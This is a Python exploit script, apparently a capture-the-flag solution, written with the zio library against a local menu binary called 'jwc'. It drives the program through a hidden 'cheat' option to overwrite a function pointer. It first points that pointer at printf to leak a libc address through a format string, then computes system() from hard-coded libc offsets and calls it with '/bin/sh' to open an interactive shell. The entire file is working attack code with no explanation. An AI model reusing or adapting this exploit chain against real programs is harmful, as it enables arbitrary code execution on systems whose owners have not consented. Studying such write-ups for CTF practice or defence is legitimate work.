from zio import *

target  = './jwc'
io      = zio(target, print_read = COLORED(RAW, 'blue'), print_write = COLORED(RAW, 'green'), timeout = 10000)

io.gdb_hint([0x401624])

# student                       (0xf0)
# name      0x00    -   0x0f    (0x10)
# essay     0x11    -   0xd8    (0xc8)
# math      0xe0    -   0xe7    (0x08)
# english   0xe8    -   0xef    (0x08) 
# dota      0xf0    -   0xe7    (0x08) 

# exam                          (0x60)
# exam_type 0x00    -   0x03    (0x04)
# essay_len 0x04    -   0x07    (0x04)
# exam_size 0x08    -   0x0b    (0x04)
# essay_ptr 0x10    -   0x17    (0x08)
# score_fun 0x18    -   0x1f    (0x08)

# essay                         (size)

def register(name, introduce):
    io.read_until('6.exit')
    io.writeline('1')
    io.read_until('your name, no more than 16 chars')
    io.writeline(name)
    io.read_until('with no more than 200 chars to introduce yourself')
    io.writeline(introduce)

def exam(idx, essay):
    io.read_until('6.exit')
    io.writeline('2')
    io.read_until('3.dota')
    io.writeline(str(idx))
    io.read_until('length of your essay?')
    io.writeline(str(len(essay)))
    io.read_until('OK')
    io.writeline(essay)

def resit(idx):
    io.read_until('6.exit')
    io.writeline('5')
    io.read_until('3.dota')
    io.writeline(str(idx))

def cheat(idx, essay):
    io.read_until('6.exit')
    io.writeline('1024')
    io.read_until('here you can cheat :')
    io.writeline(str(idx))
    io.writeline(essay)

register('A' * 0x10, 'B' * 200)
exam(1, '\x00'.ljust(0x68, 'A'))
resit(1)
exam(2, '\x00'.ljust(0x68, 'A'))

plt_printf  = 0x4009b0
cheat(1, '%11$lx'.ljust(0x18, 'A') + l64(plt_printf))
io.writeline('3')
io.read_until('math')
io.read_line()
adr_libc_start_main_ret = int(io.read(12), 16)
off_libc_start_main_ret = 0x21ec5   # ./find __libc_start_main ec5; ./dump libc6_2.19-0ubuntu6.6_amd64
adr_libc_base   = adr_libc_start_main_ret - off_libc_start_main_ret
off_system      = 0x46640
adr_system      = off_system + adr_libc_base
cheat(1, '/bin/sh;'.ljust(0x18, 'A') + l64(adr_system))
io.writeline('3')

io.interact()
